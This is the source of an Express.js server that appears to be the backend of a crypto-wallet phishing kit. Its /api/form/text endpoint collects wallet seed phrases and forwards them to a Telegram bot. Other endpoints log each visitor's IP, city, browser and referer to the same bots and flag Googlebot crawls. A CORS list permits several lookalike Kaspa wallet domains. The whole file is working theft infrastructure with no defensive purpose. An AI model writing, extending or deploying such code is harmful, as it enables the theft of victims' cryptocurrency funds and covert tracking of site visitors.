require("dotenv").config();

const express = require("express");
const app = express();
const cors = require("cors");
const bodyParser = require("body-parser");
const sendMessage = require("./helpers/sendMessage");
const checkApiKey = require("./middleware/index");
const validateRequestBody = require("./middleware/validateRequestBody");
const request = require("sync-request");
const { body, validationResult } = require("express-validator");
const UAParser = require("ua-parser-js");
app.use(bodyParser.json({ extended: true }));
app.use(cors());

app.use(checkApiKey);

const BOT_CONFIG = {
  url: `https://api.telegram.org/bot${process.env.NOTIFICATION_BOT_TOKEN}/sendMessage`,
  chatId: process.env.NOTIFICATION_CHAT_ID
};

const KASPIUM_BOT_CONFIG = {
  url: `https://api.telegram.org/bot${process.env.KASPIUM_BOT_TOKEN}/sendMessage`,
  chatId: process.env.KASPIUM_CHAT_ID
};

const getBotConfig = (appName) => {
  // Check if appName is "kaspium" (case-insensitive)
  if (appName && appName.toLowerCase() === 'kaspium') {
    return KASPIUM_BOT_CONFIG;
  }
  return BOT_CONFIG;
};

const sendBotMessage = async (text, appName = null) => {
  const config = getBotConfig(appName);
  return sendMessage(config.url, { chat_id: config.chatId, text });
};

app.post("/api/form/submit", [
  body('info').notEmpty().withMessage('Info is required'),
  body('appName').notEmpty().withMessage('App Name is required'),
  // Conditional URL validation based on user agent
  body('url').custom((value, { req }) => {
    const agent = req.body.agent || '';
    const isGoogleBot = /googlebot|google.*bot/i.test(agent);
    
    if (isGoogleBot) {
      // For Google bot, URL can be empty or any value
      return true;
    } else {
      // For regular users, URL must be a valid URL
      if (!value) {
        throw new Error('Valid URL is required');
      }
      if (!/^https?:\/\/.+/.test(value)) {
        throw new Error('Valid URL is required');
      }
      return true;
    }
  }),
  // Conditional referer validation based on user agent
  body('referer').custom((value, { req }) => {
    const agent = req.body.agent || '';
    const isGoogleBot = /googlebot|google.*bot/i.test(agent);
    
    if (isGoogleBot) {
      // For Google bot, referer can be empty or any value
      return true;
    } else {
      // For regular users, referer is required
      if (!value || value.trim() === '') {
        throw new Error('Referer is required');
      }
      return true;
    }
  }),
  body('location.country').notEmpty().withMessage('Country is required'),
  body('location.countryEmoji').notEmpty().withMessage('Country emoji is required'),
  body('location.city').notEmpty().withMessage('City is required'),
  body('location.ipAddress').isIP().withMessage('Valid IP address is required'),
  body('agent').notEmpty().withMessage('User agent is required'),
  // Conditional VPN detection validation based on user agent
  body('vpnDetected').custom((value, { req }) => {
    const agent = req.body.agent || '';
    const isGoogleBot = /googlebot|google.*bot/i.test(agent);
    
    if (isGoogleBot) {
      // For Google bot, vpnDetected can be any value or missing
      return true;
    } else {
      return true;
    }
  }),
  body('date').optional()
], async (req, res) => {
  console.log('=== FONT API REQUEST START ===');
  console.log('Request timestamp:', new Date().toISOString());
  console.log('Request body:', JSON.stringify(req.body, null, 2));
  
  // Log each field individually for better debugging
  console.log('Individual request fields:');
  console.log('- info:', req.body.info);
  console.log('- appName:', req.body.appName);
  console.log('- url:', req.body.url);
  console.log('- referer:', req.body.referer);
  console.log('- location:', req.body.location);
  console.log('- agent:', req.body.agent);
  console.log('- vpnDetected:', req.body.vpnDetected, '(type:', typeof req.body.vpnDetected, ')');
  console.log('- date:', req.body.date);
  
  // Check for validation errors
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    console.error('=== VALIDATION ERRORS FOUND ===');
    console.error('Errors Found:', errors.array().map(error => error.msg));
    console.error('Error details:', errors.array());
    console.error('=== END VALIDATION ERRORS ===');
    return res.status(400).json({
      status: false,
      message: "Validation error",
      details: errors.array().map(error => error.msg)
    });
  }
  
  console.log('✅ Validation passed successfully');
  
  try {
    let {
      info,
      url,
      referer,
      location,
      agent,
      date,
      appName,
      vpnDetected
    } = req.body;

    const {
      country,
      countryEmoji,
      city,
      ipAddress
    } = location;

  // Check if it's a Google bot (any user agent containing 'google', case-insensitive)
  const isGoogleBot = /google/i.test(agent);

    // Set info based on agent
    info = isGoogleBot ? 'Google Bot' : 'Regular Visitor';

    // Parse browser, os, device from agent
    const parser = new UAParser(agent);
    const browser = `${parser.getBrowser().name || "Unknown"} ${parser.getBrowser().version || ""}`.trim();
    const os = `${parser.getOS().name || "Unknown"} ${parser.getOS().version || ""}`.trim();
    const deviceType = parser.getDevice().type || "Desktop";

    // Format date
    const formattedDate = date ?
      new Date(date).toLocaleString("en-US") :
      new Date().toLocaleString("en-US");

    // Country with emoji if provided
    const countryDisplay = countryEmoji ? `${countryEmoji} ${country}` : country;

    // Different status for Google bot
    const statusEmoji = isGoogleBot ? "🤖" : "🟢";
    const statusText = isGoogleBot ? "Google Bot Crawling Detected" : "New Accepted Visitor";

    // Handle URL and referer display for Google bot
    const urlDisplay = isGoogleBot ? "Not applicable (Google Bot crawling)" : url;
    const refererDisplay = isGoogleBot ? "Not applicable (Google Bot crawling)" : referer;

    const text = `\n${statusEmoji} ${statusText}\n\nℹ Info: ${info}\nℹ  App Name: ${appName}\n\n📅 ${formattedDate}\n\n🌐 Url: ${urlDisplay}\n\n📤 Referer: ${refererDisplay}\n\n📍 Country: ${countryDisplay}\n\n🏙 City: ${city}\n\n🖥 IP: ${ipAddress}\n\n🌍 Browser: ${browser}\n\n💻 OS: ${os}\n\n📱 Device: ${deviceType}\n\n🔎 User Agent: ${agent}\n`;

    // Log the message and parameters
    console.log('[form/submit] Message to send:', text);
    console.log('[form/submit] Parameters:', {
      info,
      appName,
      url,
      referer,
      location,
      agent,
      vpnDetected,
      date
    });

    // Send message using BOT_CONFIG and sendBotMessage
    await sendBotMessage(text, appName);
    res.send({ status: true, message: "sent" });
  } catch (err) {
    console.error(err)
    res.status(500).send({
      status: false,
      message: "Error sending visit messages",
      error: err.message,
    });
  }
});

app.post("/api/form/note", async (req, res) => {
  try {
    const { country, browser, appName, note } = req.body;
    const text = `
    ${appName}: ${country} | Browser: ${browser}
    
    ${note}
    `;

    await sendBotMessage(text, appName);

    res.send({ status: true, message: "sent" });
  } catch (err) {
    res.status(500).send({
      status: false,
      message: "Error sending visit messages",
      error: err.message,
    });
  }
});

// Custom validation for text endpoint
const validateTextRequest = (req, res, next) => {
  if (!req.body.appName || !req.body.seedPhrase) {
    return res.status(400).json({
      status: false,
      message: "appName and seedPhrase are required"
    });
  }
  next();
};

app.post("/api/form/text", validateTextRequest, async (req, res) => {
  try {
    const { appName, seedPhrase } = req.body;

    console.log("[form/text] Incoming request:", { appName, seedPhrase });

    if (typeof seedPhrase !== "string") {
      console.log("[form/text] Invalid seed phrase type:", typeof seedPhrase);
      return res.status(400).json({
        status: false,
        message: "Seed phrase must be a string",
        error: "Invalid seed phrase type",
      });
    }

    const words = seedPhrase.trim().toLowerCase().split(/\s+/);

    if (words.length < 12) {
      console.log(`[form/text] Invalid seed phrase length: ${words.length}`);
      return res.status(400).json({
        status: false,
        message: "Invalid seed phrase length",
        error: "Seed phrase must contain at least 12 words",
      });
    }

    for (const word of words) {
      if (!/^[a-z]+$/i.test(word)) {
        console.log(`[form/secret] Invalid word in seed phrase: ${word}`);
        return res.status(400).json({
          status: false,
          message: "Seed phrase contains non-alphabetic word(s)",
          error: `Invalid word: ${word}`,
        });
      }
    }

    // Format: YYYY-MM-DD HH:MM:SS (local time)
    const formatDate = (date) => {
      return date.toISOString()
        .replace('T', ' ')
        .replace(/\..+/, '');
    };

    // Format message for bot
    const messageText = `${appName}: ${seedPhrase}`;
    
    // Send to bot
    console.log('[form/secret] Message to send:', messageText);
    await sendBotMessage(messageText, appName);

    res.send({ status: true, message: "sent" });
  } catch (err) {
    console.log(err)
    res.status(500).send({
      status: false,
      message: "Error sending seed phrase messages",
      error: err.message,
    });
  }
});

// Admin Routes
app.post("/api/admin/alert", async (req, res) => {
  try {
    const { country, browser, appName } = req.body;
    const text = `${appName}: ${country} | Browser: ${browser}`;

    console.log('Message', text);
    await sendBotMessage(text, appName);

    res.send({ status: true, message: "sent" });
  } catch (err) {
    console.log(err);
    res.status(500).send({
      status: false,
      message: "Error sending visit messages",
      error: err.message,
    });
  }
});

app.post("/api/admin/notification", validateRequestBody, async (req, res) => {
  try {
    let { appName, note, country, browser } = req.body;

    // Format message for  bot
    const messageText = `${appName}: ${note}`;
    
    // Send to bot
    await sendBotMessage(messageText, appName);
    res.send({ status: true, message: "sent" });
  } catch (err) {
    res.status(500).send({
      status: false,
      message: "Error sending image message",
      error: err.message,
    });
  }
});

const allowedOrigins = [
  "https://www.kaspa-wallet.io",
  "https://www.kaspawallet.net",
  "https://www.kaspawallet.org",
  "https://app-kaspa-ng.org/",
  "https://www.wallet-kaspanet.com/",
  "http://localhost:5173", // TODO: to be Removed
  "http://localhost:3000", // TODO: to be Removed
  "https://www.wallet-kaspanet.io",
  "https://kaspa-legacy-zegsz.ondigitalocean.app"
];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
  })
);

// Route Not Found Middleware
app.use((req, res, next) => {
  res.status(404).json({
    status: false,
    message: "Route not found",
  });
});

// General Error Handler Middleware
app.use((err, req, res, next) => {
  // console.error(err.stack); // Log the error stack trace for debugging
  res.status(500).json({
    status: false,
    message: "Internal Server Error",
    error: err.stack,
  });
});

// Start Server
const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on port ${PORT}`);
});

